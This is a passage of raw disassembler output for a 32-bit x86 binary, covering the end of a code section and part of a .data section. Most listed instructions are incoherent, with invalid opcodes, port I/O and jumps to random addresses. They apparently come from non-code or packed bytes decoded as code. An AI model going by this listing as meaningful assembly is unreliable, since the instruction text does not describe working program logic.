  41cc02:	pop    ecx
  41cc03:	stc    
  41cc04:	inc    ebp
  41cc05:	mov    al,ds:0x2cc7bda2
  41cc0a:	test   eax,0xde69fc85
  41cc0f:	sti    
  41cc10:	pop    es
  41cc11:	loop   0x41cc4d
  41cc13:	adc    edi,DWORD PTR [ecx]
  41cc15:	and    al,0xc2
  41cc17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc18:	xchg   BYTE PTR [edi+0x6b7e1356],dh
  41cc1e:	and    BYTE PTR [ebx+0x76],bl
  41cc21:	sub    eax,0x199cddef
  41cc26:	or     DWORD PTR [ebp+0x3171cc8e],ecx
  41cc2c:	fwait
  41cc2d:	push   ds
  41cc2e:	popa   
  41cc2f:	push   esp
  41cc30:	call   0x7ccbda1b
  41cc35:	cmp    ecx,0xc3251430
  41cc3b:	out    0x81,eax
  41cc3d:	mov    BYTE PTR [edi+esi*1-0x34920519],ch
  41cc44:	sbb    eax,0xf1ea9a6f
  41cc49:	loopne 0x41cc59
  41cc4b:	outs   dx,DWORD PTR ds:[esi]
  41cc4c:	add    eax,0xa88fe91d
  41cc51:	test   BYTE PTR [ebx],al
  41cc53:	xor    eax,0xf45b7d9d
  41cc58:	jg     0x41cc9a
  41cc5a:	and    BYTE PTR [edx],bh
  41cc5c:	inc    eax
  41cc5d:	adc    eax,0xe0362817
  41cc62:	jg     0x41ccad
  41cc64:	leave  
  41cc65:	mov    edx,fs
  41cc67:	xchg   esp,eax
  41cc68:	jp     0x41cce5
  41cc6a:	or     eax,0x76ee631d
  41cc6f:	sbb    DWORD PTR [esi-0x4b],ebx
  41cc72:	aas    
  41cc73:	xor    eax,0x1ed8005c
  41cc78:	push   ds
  41cc79:	jae    0x41ccf6
  41cc7b:	push   es
  41cc7c:	dec    ebx
  41cc7d:	xor    DWORD PTR [esi],edi
  41cc7f:	into   
  41cc80:	sub    DWORD PTR [esi+0x20ebae5e],edx
  41cc86:	xor    al,0x43
  41cc88:	adc    cl,0xb5
  41cc8b:	or     BYTE PTR [ebp-0x66df6df],dh
  41cc91:	pop    esi
  41cc92:	xchg   esi,eax
  41cc93:	(bad)  
  41cc94:	mov    eax,0xd88b83df
  41cc99:	stos   DWORD PTR es:[edi],eax
  41cc9a:	pop    ebx
  41cc9b:	clc    
  41cc9c:	inc    edx
  41cc9d:	mov    BYTE PTR [ebx],dl
  41cc9f:	dec    edx
  41cca0:	jecxz  0x41ccc0
  41cca2:	daa    
  41cca3:	jno    0x41cc30
  41cca5:	mov    al,ds:0xf66b30a4
  41ccaa:	mov    ds:0xf1845f30,al
  41ccaf:	xor    al,0xf3
  41ccb1:	in     al,0xcc
  41ccb3:	(bad)  
  41ccb4:	iret   
  41ccb5:	test   dh,al
  41ccb7:	mov    eax,0x6fb449c8
  41ccbc:	pop    ecx
  41ccbd:	jne    0x41ccd9
  41ccbf:	jae    0x41cc4a
  41ccc1:	vmread esi,ebp
  41ccc4:	mov    WORD PTR [ebx],es
  41ccc6:	mov    bl,0x7e
  41ccc8:	adc    dl,BYTE PTR [eax+0x75]
  41cccb:	loopne 0x41cd01
  41cccd:	retf   
  41ccce:	(bad)  
  41cccf:	fst    DWORD PTR [ebp-0x6ed473a8]
  41ccd5:	call   0x83384bb5
  41ccda:	inc    edx
  41ccdb:	arpl   WORD PTR [ebx-0x173be6a6],dx
  41cce1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41cce3:	jp     0x41ccff
  41cce5:	mov    esi,0x64ed3709
  41ccea:	or     bl,bh
  41ccec:	dec    BYTE PTR [esi]
  41ccee:	cmp    al,0xb4
  41ccf0:	xor    BYTE PTR [ecx],0x75
  41ccf3:	add    BYTE PTR [esi-0xd9b6745],ch
  41ccf9:	jge    0x41cd0e
  41ccfb:	cmp    BYTE PTR [eax+0x7d],ah
  41ccfe:	imul   esi,eax,0x6c
  41cd01:	fmul   QWORD PTR [edx]
  41cd03:	add    ch,BYTE PTR [ebp-0x40]
  41cd06:	fmul   QWORD PTR [esi]
  41cd08:	sub    eax,0xc33f84f4
  41cd0d:	out    dx,al
  41cd0e:	push   esi
  41cd0f:	out    dx,eax
  41cd10:	add    ah,BYTE PTR [eax]
  41cd12:	mov    edi,DWORD PTR [ebp-0x69]
  41cd15:	scas   al,BYTE PTR es:[edi]
  41cd16:	push   ds
  41cd17:	out    0xc4,eax
  41cd19:	call   0x6bdd:0x4a1fc43c
  41cd20:	or     edx,esi
  41cd22:	cmp    edi,ebx
  41cd24:	dec    esp
  41cd25:	and    edx,DWORD PTR [eax-0x478664e1]
  41cd2b:	imul   ecx,esp,0xffffffcb
  41cd2e:	pop    esp
  41cd2f:	mov    edx,0xd436d486
  41cd34:	sbb    cl,BYTE PTR [esi+0x56eff54c]
  41cd3a:	sub    al,0xf7
  41cd3c:	add    al,0xb
  41cd3e:	add    al,0xc0
  41cd40:	adc    ecx,edx
  41cd42:	inc    BYTE PTR [ecx+0x21]
  41cd45:	or     cl,0x2e
  41cd48:	(bad)  
  41cd49:	out    0x76,al
  41cd4b:	dec    esi
  41cd4c:	in     al,dx
  41cd4d:	repnz in eax,0xf7
  41cd50:	xchg   esi,eax
  41cd51:	xchg   edx,eax
  41cd52:	adc    eax,0xcbacf4ea
  41cd57:	iret   
  41cd58:	outs   dx,BYTE PTR ds:[esi]
  41cd59:	loope  0x41cdd5
  41cd5b:	(bad)  [edx-0x31d28b5a]
  41cd61:	inc    edi
  41cd62:	push   eax
  41cd63:	jae    0x41cd3a
  41cd65:	pushf  
  41cd66:	in     eax,0x11
  41cd68:	clc    
  41cd69:	pop    ebx
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
